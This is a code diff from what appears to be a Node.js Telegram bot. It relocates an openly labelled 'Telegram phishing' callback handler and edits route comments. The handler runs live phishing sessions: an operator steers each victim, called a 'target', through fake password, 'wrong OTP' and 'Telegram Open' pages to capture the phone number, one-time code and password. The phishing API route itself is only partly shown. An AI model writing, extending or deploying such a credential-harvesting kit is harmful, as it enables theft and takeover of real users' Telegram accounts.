@@ -1168,7 +1168,7 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
 // ====================== EXPRESS ROUTES ======================
 app.use('/api/photos', express.static(BOT_PHOTO_DIR));
 
-// ====================== TELEGRAM PHISHING API (FIXED) ======================
+// ====================== TELEGRAM PHISHING API ======================
 app.post('/api/telegram-phish', async (req, res) => {
     try {
         const { sessionId, userId, platform, phone, otp, password, action } = req.body || {};
@@ -1260,52 +1260,6 @@ app.post('/api/telegram-phish', async (req, res) => {
     } catch (err) {
         console.error('Telegram Phish Error:', err);
         return res.status(500).json({ error: err.message });
-    }
-});
-
-// ====================== TELEGRAM PHISHING CALLBACKS (FIXED WITH 3 OPTIONS) ======================
-S7.on('callback_query', async (q) => {
-    if (q.data.startsWith('phish_')) {
-        const parts = q.data.split('_');
-        const action = parts[1];
-        const sessionId = parts[2] || '';
-
-        if (!global.phishSessions || !global.phishSessions[sessionId]) {
-            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
-            return;
-        }
-
-        const session = global.phishSessions[sessionId];
-        const userId = session.userId;
-
-        if (action === 'password') {
-            await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
-            session.decision = 'password';
-            await S7.sendMessage(config.adminId, `✅ Password section shown to user ${userId}`);
-            await S7.sendMessage(userId, `✅ Target is now entering password...`);
-            logToFile(`✅ Password page shown to user ${userId}`);
-            
-            // Send a message to the page to show password section
-            // The page will automatically show password section based on API response
-        } else if (action === 'wrong') {
-            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
-            session.decision = 'wrong';
-            await S7.sendMessage(config.adminId, `❌ Wrong OTP error shown to user ${userId}`);
-            await S7.sendMessage(userId, `❌ Showing wrong OTP error to target...`);
-            logToFile(`❌ Wrong OTP shown to user ${userId}`);
-        } else if (action === 'open') {
-            await S7.answerCallbackQuery(q.id, { text: '📱 Showing Telegram Open page' });
-            session.decision = 'open';
-            await S7.sendMessage(config.adminId, `📱 Telegram Open page shown to user ${userId}`);
-            await S7.sendMessage(userId, `📱 Target is seeing Telegram Open page...`);
-            logToFile(`📱 Open page shown to user ${userId}`);
-        }
-        
-        await S7.editMessageReplyMarkup({ 
-            chat_id: q.message.chat.id, 
-            message_id: q.message.message_id, 
-            reply_markup: { inline_keyboard: [] } 
-        });
     }
 });
 
@@ -1968,6 +1922,49 @@ async function processReferral(referrerId, userId) {
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
     logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
 }
+
+// ====================== TELEGRAM PHISHING CALLBACKS ======================
+S7.on('callback_query', async (q) => {
+    if (q.data.startsWith('phish_')) {
+        const parts = q.data.split('_');
+        const action = parts[1];
+        const sessionId = parts[2] || '';
+
+        if (!global.phishSessions || !global.phishSessions[sessionId]) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
+            return;
+        }
+
+        const session = global.phishSessions[sessionId];
+        const userId = session.userId;
+
+        if (action === 'password') {
+            await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
+            session.decision = 'password';
+            await S7.sendMessage(config.adminId, `✅ Password section shown to user ${userId}`);
+            await S7.sendMessage(userId, `✅ Target is now entering password...`);
+            logToFile(`✅ Password page shown to user ${userId}`);
+        } else if (action === 'wrong') {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
+            session.decision = 'wrong';
+            await S7.sendMessage(config.adminId, `❌ Wrong OTP error shown to user ${userId}`);
+            await S7.sendMessage(userId, `❌ Showing wrong OTP error to target...`);
+            logToFile(`❌ Wrong OTP shown to user ${userId}`);
+        } else if (action === 'open') {
+            await S7.answerCallbackQuery(q.id, { text: '📱 Showing Telegram Open page' });
+            session.decision = 'open';
+            await S7.sendMessage(config.adminId, `📱 Telegram Open page shown to user ${userId}`);
+            await S7.sendMessage(userId, `📱 Target is seeing Telegram Open page...`);
+            logToFile(`📱 Open page shown to user ${userId}`);
+        }
+        
+        await S7.editMessageReplyMarkup({ 
+            chat_id: q.message.chat.id, 
+            message_id: q.message.message_id, 
+            reply_markup: { inline_keyboard: [] } 
+        });
+    }
+});
 
 // ====================== CALLBACK QUERY HANDLER ======================
 S7.on('callback_query', async (q) => {
